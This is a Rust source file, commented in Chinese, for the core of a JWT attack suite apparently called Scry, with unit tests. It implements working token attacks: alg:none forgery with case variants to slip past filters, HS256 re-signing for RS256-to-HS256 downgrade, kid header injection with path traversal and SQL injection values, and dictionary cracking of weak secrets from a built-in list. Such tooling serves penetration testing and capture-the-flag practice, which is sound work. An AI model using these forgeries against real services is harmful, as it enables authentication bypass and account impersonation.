//! Scry JWT 攻击套件内核(对标 **Burp JWT Editor / jwt_tool**)—— **纯函数、零网络、可单测**。
//!
//! 覆盖打靶 / 实战最常用的 JWT 攻击原语:
//! - [`decode`]:拆 `header.payload.signature`,base64url 解出 JSON + 取 `alg`(不验签)。
//! - [`forge_none`]:`alg:none` 绕过(空签名;含 `none/None/NONE` 大小写变体绕大小写过滤的 [`forge_none_variant`])。
//! - [`sign_hs256`] / [`sign_with_header`]:用(弱)密钥签 HS256 —— 把 RS256→HS256 降级 / 改 claim 后重签。
//! - [`forge_kid`]:`kid` 头注入(目录穿越 / SQLi 等场景塞恶意 `kid` 再签)。
//! - [`verify_hs256`] / [`crack_hs256`]:重算签名校验 + 字典爆破弱密钥([`COMMON_SECRETS`] 内置常见弱密钥表)。
//!
//! 签名只实现 **HS256**(对称、打靶占比最高);RS/ES 等非对称签名需私钥,工具侧不内置(超出范围)。
//! base64url **无填充**(JWT 规范);HMAC-SHA256 直接用 `sha2`(标准块长 64 的 ipad/opad 构造)。

use sha2::{Digest, Sha256};

/// base64url 字母表(RFC 4648 §5,`-_` 替 `+/`)。
const B64URL: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

/// base64url 编码(**无填充**,JWT 规范)。
pub fn b64url_encode(data: &[u8]) -> String {
    let mut out = String::with_capacity(data.len().div_ceil(3) * 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0];
        let b1 = *chunk.get(1).unwrap_or(&0);
        let b2 = *chunk.get(2).unwrap_or(&0);
        let n = ((b0 as u32) << 16) | ((b1 as u32) << 8) | (b2 as u32);
        out.push(B64URL[((n >> 18) & 63) as usize] as char);
        out.push(B64URL[((n >> 12) & 63) as usize] as char);
        if chunk.len() > 1 {
            out.push(B64URL[((n >> 6) & 63) as usize] as char);
        }
        if chunk.len() > 2 {
            out.push(B64URL[(n & 63) as usize] as char);
        }
    }
    out
}

/// base64url 解码(容忍标准字母表 `+/`、填充 `=` 与空白)。非法字符直接忽略。
pub fn b64url_decode(s: &str) -> Vec<u8> {
    let mut rev = [255u8; 256];
    for (i, &c) in B64URL.iter().enumerate() {
        rev[c as usize] = i as u8;
    }
    // 兼容标准 base64 字母表。
    rev[b'+' as usize] = 62;
    rev[b'/' as usize] = 63;
    let bytes: Vec<u8> = s.bytes().filter(|&c| rev[c as usize] != 255).collect();
    let mut out = Vec::with_capacity(bytes.len() / 4 * 3);
    for chunk in bytes.chunks(4) {
        if chunk.len() < 2 {
            break;
        }
        let mut n = 0u32;
        for (i, &c) in chunk.iter().enumerate() {
            n |= (rev[c as usize] as u32) << (18 - 6 * i);
        }
        out.push((n >> 16) as u8);
        if chunk.len() > 2 {
            out.push((n >> 8) as u8);
        }
        if chunk.len() > 3 {
            out.push(n as u8);
        }
    }
    out
}

/// 标准 HMAC-SHA256(块长 64)。
pub fn hmac_sha256(key: &[u8], msg: &[u8]) -> Vec<u8> {
    const BLOCK: usize = 64;
    let mut k = if key.len() > BLOCK {
        let mut h = Sha256::new();
        h.update(key);
        h.finalize().to_vec()
    } else {
        key.to_vec()
    };
    k.resize(BLOCK, 0);
    let ipad: Vec<u8> = k.iter().map(|b| b ^ 0x36).collect();
    let opad: Vec<u8> = k.iter().map(|b| b ^ 0x5c).collect();
    let mut inner = Sha256::new();
    inner.update(&ipad);
    inner.update(msg);
    let inner_hash = inner.finalize();
    let mut outer = Sha256::new();
    outer.update(&opad);
    outer.update(inner_hash);
    outer.finalize().to_vec()
}

/// 解码后的 JWT(各段已 base64url 解出;签名保留原始 base64url 串,**不验证**)。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DecodedJwt {
    /// header JSON(解码后的 UTF-8,无效则有损转换)。
    pub header: String,
    /// payload JSON(解码后的 UTF-8)。
    pub payload: String,
    /// 签名(原始 base64url,未解码 / 未验证)。
    pub signature: String,
    /// `alg` 字段值(从 header JSON 浅扫;缺失为空串)。
    pub alg: String,
}

/// 拆 `header.payload.signature` 并 base64url 解出 header / payload(不验签)。
///
/// 至少要有 `header.payload` 两段;签名段可缺(`alg:none` 令牌常以 `.` 结尾)。
pub fn decode(token: &str) -> Result<DecodedJwt, String> {
    let t = token.trim();
    let parts: Vec<&str> = t.split('.').collect();
    if parts.len() < 2 || parts[0].is_empty() || parts[1].is_empty() {
        return Err("不是 JWT(应为 header.payload.signature)".into());
    }
    let header = String::from_utf8_lossy(&b64url_decode(parts[0])).into_owned();
    let payload = String::from_utf8_lossy(&b64url_decode(parts[1])).into_owned();
    let signature = parts.get(2).copied().unwrap_or("").to_string();
    let alg = json_string_field(&header, "alg").unwrap_or_default();
    Ok(DecodedJwt {
        header,
        payload,
        signature,
        alg,
    })
}

/// 从一个扁平 JSON 对象里浅扫某个**字符串字段**的值(够用于取 `alg` / `kid`,不引 JSON 依赖)。
///
/// 找 `"name"` 后第一个 `:`,再取其后的第一个带引号字符串(处理 `\"` 转义)。非字符串值返回 `None`。
pub fn json_string_field(json: &str, name: &str) -> Option<String> {
    let needle = format!("\"{name}\"");
    let key_pos = json.find(&needle)?;
    let after = &json[key_pos + needle.len()..];
    let colon = after.find(':')?;
    let rest = after[colon + 1..].trim_start();
    let mut chars = rest.char_indices();
    // 值必须以引号开头(只取字符串型)。
    match chars.next() {
        Some((_, '"')) => {}
        _ => return None,
    }
    let mut val = String::new();
    let mut escaped = false;
    for (_, ch) in chars {
        if escaped {
            val.push(ch);
            escaped = false;
        } else if ch == '\\' {
            escaped = true;
        } else if ch == '"' {
            return Some(val);
        } else {
            val.push(ch);
        }
    }
    None
}

/// 把任意 header/payload **JSON 文本**压成单行(去多余空白)后参与签名,保证签出来的串稳定。
/// 仅去除字符串字面量**之外**的空白,字符串内空白保留。
fn minify_json(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut in_str = false;
    let mut escaped = false;
    for ch in s.chars() {
        if in_str {
            out.push(ch);
            if escaped {
                escaped = false;
            } else if ch == '\\' {
                escaped = true;
            } else if ch == '"' {
                in_str = false;
            }
        } else if ch == '"' {
            in_str = true;
            out.push(ch);
        } else if !ch.is_whitespace() {
            out.push(ch);
        }
    }
    out
}

/// `alg:none` 伪造:用给定 payload 造一个空签名令牌(`header.payload.`)。
///
/// 经典认证绕过——服务端若信任令牌自带的 `alg` 且接受 `none`,即可任意伪造 claim。
pub fn forge_none(payload_json: &str) -> String {
    forge_none_variant(payload_json, "none")
}

/// `alg:none` 的大小写变体(`none` / `None` / `NONE` / `nOnE`),用于绕过只黑名单了小写 `none` 的过滤。
pub fn forge_none_variant(payload_json: &str, alg: &str) -> String {
    let header = format!("{{\"alg\":\"{alg}\",\"typ\":\"JWT\"}}");
    let h = b64url_encode(header.as_bytes());
    let p = b64url_encode(minify_json(payload_json).as_bytes());
    format!("{h}.{p}.")
}

/// 用密钥签一个标准 HS256 令牌(header 固定 `{"alg":"HS256","typ":"JWT"}`)。
pub fn sign_hs256(secret: &str, payload_json: &str) -> String {
    sign_with_header(secret, "{\"alg\":\"HS256\",\"typ\":\"JWT\"}", payload_json)
}

/// 用密钥签一个**自定义 header** 的 HS256 令牌(header / payload 均按原文 JSON 压行后编码再 HMAC)。
///
/// 用于 RS256→HS256 降级(把公钥当 HMAC 密钥)、`kid` 注入等需要自定义 header 的场景。
pub fn sign_with_header(secret: &str, header_json: &str, payload_json: &str) -> String {
    let h = b64url_encode(minify_json(header_json).as_bytes());
    let p = b64url_encode(minify_json(payload_json).as_bytes());
    let signing_input = format!("{h}.{p}");
    let sig = b64url_encode(&hmac_sha256(secret.as_bytes(), signing_input.as_bytes()));
    format!("{signing_input}.{sig}")
}

/// `kid`(Key ID)头注入:造 `{"alg":"HS256","typ":"JWT","kid":"<kid>"}` 头并用 `secret` 签。
///
/// `kid` 可塞目录穿越(`../../dev/null`)、SQLi(`x' UNION SELECT …`)等,诱导服务端用攻击者可控密钥验签。
pub fn forge_kid(secret: &str, payload_json: &str, kid: &str) -> String {
    let kid_esc = json_escape(kid);
    let header = format!("{{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"{kid_esc}\"}}");
    sign_with_header(secret, &header, payload_json)
}

/// 最小 JSON 字符串转义(`"` 与 `\`,够 kid 注入用)。
fn json_escape(s: &str) -> String {
    s.replace('\\', "\\\\").replace('"', "\\\"")
}

/// 校验一个 HS256 令牌的签名是否由 `secret` 产生(重算 `HMAC(header.payload)` 比对)。
///
/// 用 base64url 解码后的**字节比较**(避免 padding / 字母表差异造成的误判)。
pub fn verify_hs256(token: &str, secret: &str) -> bool {
    let parts: Vec<&str> = token.trim().split('.').collect();
    if parts.len() != 3 || parts[2].is_empty() {
        return false;
    }
    let signing_input = format!("{}.{}", parts[0], parts[1]);
    let expect = hmac_sha256(secret.as_bytes(), signing_input.as_bytes());
    let got = b64url_decode(parts[2]);
    // 长度不同直接 false;长度相同做常量时间比较(防计时侧信道,虽离线意义有限)。
    if got.len() != expect.len() {
        return false;
    }
    let mut diff = 0u8;
    for (a, b) in got.iter().zip(expect.iter()) {
        diff |= a ^ b;
    }
    diff == 0
}

/// 字典爆破 HS256 弱密钥:逐个候选 [`verify_hs256`],返回第一个命中的密钥。
pub fn crack_hs256<S: AsRef<str>>(token: &str, candidates: &[S]) -> Option<String> {
    candidates
        .iter()
        .find(|s| verify_hs256(token, s.as_ref()))
        .map(|s| s.as_ref().to_string())
}

/// 内置常见弱密钥表(打靶 / 实战高频:默认密钥、示例密钥、空串等)。
pub const COMMON_SECRETS: &[&str] = &[
    "",
    "secret",
    "Secret",
    "secret123",
    "password",
    "Password",
    "passw0rd",
    "123456",
    "12345678",
    "changeme",
    "admin",
    "administrator",
    "root",
    "test",
    "key",
    "private",
    "jwt",
    "jwtsecret",
    "jwt_secret",
    "jwtSecret",
    "your-256-bit-secret",
    "your-secret-key",
    "supersecret",
    "super_secret",
    "s3cr3t",
    "qwerty",
    "letmein",
    "hello",
    "default",
    "token",
    "signature",
    "hmac",
    "shhhh",
    "mysecret",
    "my_secret",
    "topsecret",
    "secretkey",
    "secret_key",
    "skeleton",
    "iloveyou",
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn b64url_roundtrip() {
        for s in ["", "f", "fo", "foo", "foob", "fooba", "foobar", "你好 jwt"] {
            let enc = b64url_encode(s.as_bytes());
            assert!(!enc.contains('='), "无填充: {enc}");
            assert!(!enc.contains('+') && !enc.contains('/'), "url 安全: {enc}");
            assert_eq!(b64url_decode(&enc), s.as_bytes());
        }
        // 容忍标准 base64 + 填充。
        assert_eq!(b64url_decode("Zm9v"), b"foo");
        assert_eq!(b64url_decode("Zm9vYg=="), b"foob");
    }

    #[test]
    fn hmac_sha256_known_vector() {
        // RFC 4231 Test Case 2: key="Jefe", data="what do ya want for nothing?"
        let mac = hmac_sha256(b"Jefe", b"what do ya want for nothing?");
        let hex: String = mac.iter().map(|b| format!("{b:02x}")).collect();
        assert_eq!(
            hex,
            "5bdcc146bf60754e6a042426089575c75a003f089d2739839dec58b964ec3843"
        );
    }

    #[test]
    fn decode_extracts_parts_and_alg() {
        // {"alg":"HS256","typ":"JWT"} . {"sub":"1","name":"a"} . SIG
        let jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwibmFtZSI6ImEifQ.SIG";
        let d = decode(jwt).unwrap();
        assert!(d.header.contains("HS256"));
        assert!(d.payload.contains("\"sub\""));
        assert_eq!(d.signature, "SIG");
        assert_eq!(d.alg, "HS256");

        assert!(decode("notajwt").is_err());
        assert!(decode("only.").is_err());
    }

    #[test]
    fn json_string_field_handles_escapes() {
        let j = r#"{"alg":"HS256","kid":"a\"b","typ":"JWT"}"#;
        assert_eq!(json_string_field(j, "alg").as_deref(), Some("HS256"));
        assert_eq!(json_string_field(j, "kid").as_deref(), Some("a\"b"));
        assert_eq!(json_string_field(j, "missing"), None);
        // 数字 / 非字符串值返回 None。
        assert_eq!(json_string_field(r#"{"n":5}"#, "n"), None);
    }

    #[test]
    fn forge_none_structure() {
        let t = forge_none(r#"{"user":"admin"}"#);
        assert!(t.ends_with('.'), "none 令牌空签名结尾: {t}");
        let d = decode(&t).unwrap();
        assert_eq!(d.alg, "none");
        assert!(d.payload.contains("admin"));
        assert_eq!(d.signature, "");

        let up = forge_none_variant(r#"{"a":1}"#, "NONE");
        assert_eq!(decode(&up).unwrap().alg, "NONE");
    }

    #[test]
    fn sign_then_verify_roundtrip() {
        let tok = sign_hs256("secret123", r#"{"user":"admin","role":"root"}"#);
        assert!(verify_hs256(&tok, "secret123"));
        assert!(!verify_hs256(&tok, "wrong"));
        let d = decode(&tok).unwrap();
        assert_eq!(d.alg, "HS256");
        assert!(d.payload.contains("root"));
    }

    #[test]
    fn custom_header_and_kid_injection() {
        let tok = forge_kid("k", r#"{"u":1}"#, "../../dev/null");
        assert!(verify_hs256(&tok, "k"));
        let d = decode(&tok).unwrap();
        assert_eq!(json_string_field(&d.header, "kid").as_deref(), Some("../../dev/null"));
        assert_eq!(d.alg, "HS256");
    }

    #[test]
    fn crack_finds_weak_secret() {
        let tok = sign_hs256("secret123", r#"{"sub":"1"}"#);
        let found = crack_hs256(&tok, COMMON_SECRETS);
        assert_eq!(found.as_deref(), Some("secret123"));

        let strong = sign_hs256("a-very-long-random-secret-not-in-list-xyz", r#"{"sub":"1"}"#);
        assert!(crack_hs256(&strong, COMMON_SECRETS).is_none());
    }

    #[test]
    fn minify_json_preserves_string_whitespace() {
        assert_eq!(minify_json("{ \"a\" : 1 }"), "{\"a\":1}");
        assert_eq!(minify_json("{\"a\":\"x y\"}"), "{\"a\":\"x y\"}");
    }
}
